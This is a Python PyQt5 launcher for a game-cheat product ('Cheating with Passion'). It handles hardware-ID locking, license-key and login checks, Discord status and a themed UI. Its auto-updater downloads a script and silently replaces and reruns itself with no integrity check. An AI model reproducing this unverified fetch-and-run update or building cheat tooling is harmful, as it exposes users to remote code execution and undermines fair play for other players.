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"
# ──────────────────────────────────────────────────────────────────────────────


CLIENT_ID = "1480247918207439011" 

STATUS = {

    "details": "Cheating with Passion",

    "large_image": "passionlogo",  
    "large_text": "getpassion.xyz",

    "small_image": "",
    "small_text": "",

    "buttons": [
        {"label": "🔥 Get Passion", "url": "https://getpassion.xyz/purchase"},
    ],

    "show_start_time": True,
}




def get_hwid() -> str:
    raw = platform.node() + str(uuid.getnode()) + platform.processor()
    return hashlib.sha256(raw.encode()).hexdigest().upper()[:32]


def load_settings() -> dict:
    defaults = {"hotkey": "F5", "toggle_key": Qt.Key_F5, "saved_key": "", "auto_login": False}
    try:
        with open(SETTINGS_FILE) as f:
            _loaded = json.load(f)
        if _loaded.get("_enc") and _loaded.get("saved_key"):
            try:
                _loaded["saved_key"] = _decrypt_str(_loaded["saved_key"].encode())
                # Strip _enc from the working dict so save_settings won't double-encrypt
                _loaded.pop("_enc", None)
            except Exception:
                _loaded["saved_key"] = ""
                _loaded.pop("_enc", None)
        defaults.update(_loaded)
    except Exception:
        pass
    return defaults


def save_settings(data: dict):
    try:
        _d = dict(data)
        # Qt enum types (e.g. Qt.Key_F5) are not JSON-serializable — cast to plain int
        if "toggle_key" in _d:
            _d["toggle_key"] = int(_d["toggle_key"])
        # Encrypt the saved key if present and not already encrypted
        if "saved_key" in _d and _d["saved_key"] and not _d.get("_enc"):
            _d["saved_key"] = _encrypt_str(_d["saved_key"]).decode()
            _d["_enc"] = True
        elif "saved_key" in _d and not _d["saved_key"]:
            # Clear the enc flag when key is cleared
            _d.pop("_enc", None)
        with open(SETTINGS_FILE, "w") as f:
            json.dump(_d, f, indent=2)
    except Exception:
        pass


def mkfont(px, weight=QFont.Normal):
    f = QFont()
    f.setFamilies(["SF Pro Display", "SF Pro Text", ".AppleSystemUIFont",
                   "Segoe UI", "Helvetica Neue", "Arial"])
    f.setPixelSize(px)
    f.setWeight(weight)
    return f


# ── Colours ────────────────────────────────────────────────────────────────────
C = {
    "bg":        "#0d0a0b",
    "sidebar":   "#141011",
    "content":   "#120d0f",
    "border":    "#2a2426",
    "red":       "#e02726",
    "red_dim":   "#8a1a1a",
    "text":      "#ede9ea",
    "sub":       "#9a9598",
    "muted":     "#5a5558",
    "input_bg":  "#1f191b",
    "input_bdr": "#2e2729",
    "active_bg": "#1e1214",
    "card_bg":   "#181214",
    "card_bdr":  "#241e20",
}

INPUT_SS = f"""
QLineEdit {{
    background-color: {C['input_bg']};
    color: #d4d0d1;
    border: 1px solid {C['input_bdr']};
    border-radius: 7px;
    padding: 0 11px;
    font-size: 13px;
}}
QLineEdit:focus {{
    border: 1px solid #4a3f42;
    background-color: #241c1f;
    color: #ede9ea;
}}
"""

BTN_SS = f"""
QPushButton {{
    background-color: {C['red']};
    color: #ffffff;
    border: none;
    border-radius: 8px;
    font-weight: bold;
    font-size: 13px;
    letter-spacing: 0.5px;
}}
QPushButton:hover   {{ background-color: #ec3534; }}
QPushButton:pressed {{ background-color: #b81e1e; }}
QPushButton:disabled{{ background-color: #3a1515; color: #6a4545; }}
"""

SCROLL_SS = """
QScrollArea { border: none; background: transparent; }
QScrollBar:vertical {
    background: transparent;
    width: 4px;
    margin: 6px 3px 6px 0;
    border-radius: 2px;
}
QScrollBar::handle:vertical {
    background: #3a2f32;
    border-radius: 2px;
    min-height: 24px;
}
QScrollBar::handle:vertical:hover { background: #dc2625; }
QScrollBar::add-line:vertical,
QScrollBar::sub-line:vertical     { height: 0; }
QScrollBar::add-page:vertical,
QScrollBar::sub-page:vertical     { background: none; }
"""


# ── Native global hotkey (Windows) ─────────────────────────────────────────────
# Maps Qt key codes to Windows VK codes for common keys
QT_TO_VK = {
    Qt.Key_F1: 0x70, Qt.Key_F2: 0x71, Qt.Key_F3: 0x72, Qt.Key_F4: 0x73,
    Qt.Key_F5: 0x74, Qt.Key_F6: 0x75, Qt.Key_F7: 0x76, Qt.Key_F8: 0x77,
    Qt.Key_F9: 0x78, Qt.Key_F10: 0x79, Qt.Key_F11: 0x7A, Qt.Key_F12: 0x7B,
    Qt.Key_Insert: 0x2D, Qt.Key_Delete: 0x2E, Qt.Key_Home: 0x24,
    Qt.Key_End: 0x23, Qt.Key_PageUp: 0x21, Qt.Key_PageDown: 0x22,
}

class GlobalHotkey(QThread):
    """Uses RegisterHotKey Win32 API — works globally even when window has no focus."""
    triggered = pyqtSignal()

    HOTKEY_ID = 1

    def __init__(self):
        super().__init__()
        self.vk        = 0x74  # F5 default
        self._running  = True

    def set_key(self, qt_key: int):
        self.vk = QT_TO_VK.get(qt_key, 0x74)

    def run(self):
        if platform.system() != "Windows":
            return
        user32 = ctypes.WinDLL("user32", use_last_error=True)

        # Unregister any previous hotkey with this ID
        user32.UnregisterHotKey(None, self.HOTKEY_ID)

        # Register the hotkey (0 = no modifiers)
        if not user32.RegisterHotKey(None, self.HOTKEY_ID, 0, self.vk):
            _noop(f"[GlobalHotkey] RegisterHotKey failed for vk=0x{self.vk:02X}")
            return

        _noop(f"[GlobalHotkey] Registered vk=0x{self.vk:02X}")

        MSG = ctypes.wintypes.MSG
        msg = MSG()
        while self._running:
            # PeekMessage with timeout-like loop so we can check _running
            ret = user32.PeekMessageW(ctypes.byref(msg), None, 0x0312, 0x0312, 1)  # WM_HOTKEY=0x0312, PM_REMOVE=1
            if ret:
                if msg.message == 0x0312 and msg.wParam == self.HOTKEY_ID:
                    self.triggered.emit()
            self.msleep(20)

        user32.UnregisterHotKey(None, self.HOTKEY_ID)

    def stop(self):
        self._running = False


# ── Workers ────────────────────────────────────────────────────────────────────
class ValidateWorker(QThread):
    done = pyqtSignal(bool, str, object)

    def __init__(self, key, hwid):
        super().__init__()
        self.key, self.hwid = key, hwid

    def run(self):
        try:
            r = requests.post(f"{API_BASE}/api/keys/validate",
                              json={"key": self.key, "hwid": self.hwid}, timeout=10)
            data = r.json()
            if data.get("valid"):
                self.done.emit(True, "", data)
            else:
                msgs = {
                    "invalid_key":      "Invalid key.",
                    "expired":          "This key has expired.",
                    "max_uses_reached": "Key usage limit reached.",
                    "hwid_mismatch":    "Key is locked to another device.",
                }
                self.done.emit(False, msgs.get(data.get("reason",""), "Validation failed."), {})
        except requests.Timeout:
            self.done.emit(False, "Connection timed out.", {})
        except Exception as e:
            self.done.emit(False, f"Network error: {e}", {})


class LoginWorker(QThread):
    done = pyqtSignal(bool, str)

    def __init__(self, username, password):
        super().__init__()
        self.username, self.password = username, password

    def run(self):
        try:
            r = requests.post(f"{API_BASE}/api/auth/login",
                              json={"username": self.username, "password": self.password}, timeout=10)
            if r.ok:
                self.done.emit(True, "")
            else:
                self.done.emit(False, r.json().get("error", "Invalid credentials."))
        except requests.Timeout:
            self.done.emit(False, "Connection timed out.")
        except Exception as e:
            self.done.emit(False, f"Network error: {e}")


# ── Auto-Updater ───────────────────────────────────────────────────────────────
def _ver_tuple(v: str):
    try:
        return tuple(int(x) for x in v.strip().split("."))
    except Exception:
        return (0,)


class UpdateChecker(QThread):
    """Silently checks R2 version.json; emits update_available if newer."""
    update_available = pyqtSignal(str, str)   # new_version, download_url
    no_update        = pyqtSignal()

    def run(self):
        try:
            r = requests.get(R2_VERSION_URL, timeout=6)
            r.raise_for_status()
            data = r.json()
            remote = data.get("version", "0.0.0")
            url    = data.get("url", "")
            if _ver_tuple(remote) > _ver_tuple(CURRENT_VERSION) and url:
                self.update_available.emit(remote, url)
            else:
                self.no_update.emit()
        except Exception:
            pass   # Silent fail — don't interrupt the user


class DownloadWorker(QThread):
    """Downloads the new .py from R2 and signals when ready."""
    finished = pyqtSignal(str)   # temp file path on success
    progress = pyqtSignal(int)   # 0-100
    failed   = pyqtSignal(str)

    def __init__(self, url: str):
        super().__init__()
        self.url = url

    def run(self):
        import tempfile
        try:
            r = requests.get(self.url, timeout=30, stream=True)
            r.raise_for_status()
            total = int(r.headers.get("content-length", 0))
            downloaded = 0
            tmp_fd, tmp_path = tempfile.mkstemp(suffix=".py")
            with os.fdopen(tmp_fd, "wb") as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total:
                        self.progress.emit(int(downloaded * 100 / total))
            self.finished.emit(tmp_path)
        except Exception as exc:
            self.failed.emit(str(exc))


def _apply_update_and_restart(tmp_path: str):
    """Replace running script with downloaded file, then restart."""
    import shutil, subprocess
    target = os.path.abspath(sys.argv[0])
    if sys.platform == "win32":
        # Can't overwrite a locked file directly on Windows — use a batch trampoline
        bat = target + ".upd.bat"
        with open(bat, "w") as f:
            f.write(f"""@echo off
ping -n 2 127.0.0.1 >nul
move /y "{tmp_path}" "{target}"
start "" "{sys.executable}" "{target}"
del "%~f0"
""")
        subprocess.Popen(bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        shutil.move(tmp_path, target)
        os.chmod(target, 0o755)
        subprocess.Popen([sys.executable, target] + sys.argv[1:])

    from PyQt5.QtWidgets import QApplication
    QApplication.quit()


class UpdateDialog(QWidget):
    """
    Styled update prompt that matches the Passion dark theme.
    Shown as an overlay on top of the main window.
    """
    def __init__(self, version: str, url: str, parent=None):
        super().__init__(parent, Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self._url     = url
        self._version = version
        self._worker  = None
        self._build()

    def _build(self):
        self.setFixedSize(340, 190)
        lay = QVBoxLayout(self)
        lay.setContentsMargins(24, 20, 24, 20)
        lay.setSpacing(10)

        title = QLabel(f"Update available  v{self._version}")
        title.setFont(mkfont(14, QFont.Bold))
        title.setStyleSheet(f"color:{C['text']}; background:transparent; border:none;")
        lay.addWidget(title)

        sub = QLabel(f"A new version of Passion is ready to download.\nCurrent: v{CURRENT_VERSION}  →  New: v{self._version}")
        sub.setFont(mkfont(11))
        sub.setStyleSheet(f"color:{C['sub']}; background:transparent; border:none;")
        sub.setWordWrap(True)
        lay.addWidget(sub)

        self._status = QLabel("")
        self._status.setFont(mkfont(11))
        self._status.setStyleSheet(f"color:{C['muted']}; background:transparent; border:none;")
        self._status.hide()
        lay.addWidget(self._status)

        self._bar = QSlider(Qt.Horizontal)
        self._bar.setRange(0, 100)
        self._bar.setEnabled(False)
        self._bar.setStyleSheet(f"""
            QSlider::groove:horizontal {{
                height: 4px; background: {C['border']}; border-radius: 2px;
            }}
            QSlider::sub-page:horizontal {{
                background: {C['red']}; border-radius: 2px;
            }}
            QSlider::handle:horizontal {{ width: 0px; }}
        """)
        self._bar.hide()
        lay.addWidget(self._bar)

        lay.addStretch()

        btns = QHBoxLayout()
        btns.setSpacing(10)

        self._skip_btn = QPushButton("Not now")
        self._skip_btn.setFixedHeight(34)
        self._skip_btn.setFont(mkfont(12))
        self._skip_btn.setCursor(QCursor(Qt.PointingHandCursor))
        self._skip_btn.setStyleSheet(f"""
            QPushButton {{
                background: {C['input_bg']}; color: {C['sub']};
                border: 1px solid {C['border']}; border-radius: 7px;
            }}
            QPushButton:hover {{ background: {C['card_bg']}; color: {C['text']}; }}
        """)
        self._skip_btn.clicked.connect(self.close)

        self._update_btn = make_btn("Update now")
        self._update_btn.setFixedHeight(34)
        self._update_btn.clicked.connect(self._start_download)

        btns.addWidget(self._skip_btn)
        btns.addWidget(self._update_btn)
        lay.addLayout(btns)

